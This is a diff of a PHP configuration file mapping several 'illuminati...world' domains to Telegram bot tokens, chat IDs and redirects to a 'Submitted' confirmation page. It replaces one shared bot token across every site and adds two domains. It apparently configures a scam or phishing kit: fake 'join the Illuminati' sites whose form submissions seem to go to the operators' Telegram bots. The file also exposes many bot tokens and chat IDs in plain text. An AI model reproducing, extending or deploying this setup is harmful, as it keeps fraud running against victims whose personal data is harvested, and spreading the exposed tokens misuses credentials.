@@ -7,7 +7,7 @@
 $site_map = [
     'illuminatiofficial.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
         "redirect" => "https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
@@ -16,7 +16,7 @@ $site_map = [
 
     'illuminatipath.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '7942412343:AAEVirV9J2LHm0-pqfmtkMYEUrEqABqVXE4', 'chat_id' => '6772487570'],
         ],
         "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
@@ -27,7 +27,7 @@ $site_map = [
 
     'illuminatisyndicate.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
         ],
         "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
@@ -39,7 +39,7 @@ $site_map = [
 
     'illuminatilight.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyhS8sGkrGnYiq4', 'chat_id' => '7575811693'],
         ],
         "redirect" => "https://illuminatilight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
@@ -49,9 +49,32 @@ $site_map = [
 
 
 
+    'illuminatielite.world' => [
+        "bots" => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '8366280325:AAHfGhwKBV9xzW4iOjOsE3S1fHEU0kOewYQ', 'chat_id' => '8237687443'],
+        ],
+        "redirect" => "https://illuminatielite.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
+    ],
+
+
+    'illuminatipathway.world' => [
+        "bots" => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            ['token' => '7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk', 'chat_id' => '7678714988'],
+        ],
+        "redirect" => "https://illuminatipathway.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
+    ],
+
+
+
+
+
+
+
     'illuminatipathtolight.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '7952525150:AAHXfhactryTuwOnidJzq6UnDGxVEFkDk8k', 'chat_id' => '7982337001'],
         ],
         "redirect" => "https://illuminatipathtolight.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
@@ -62,7 +85,7 @@ $site_map = [
     
     'illuminatisacred.world' => [
         "bots" => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
         ],
         "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
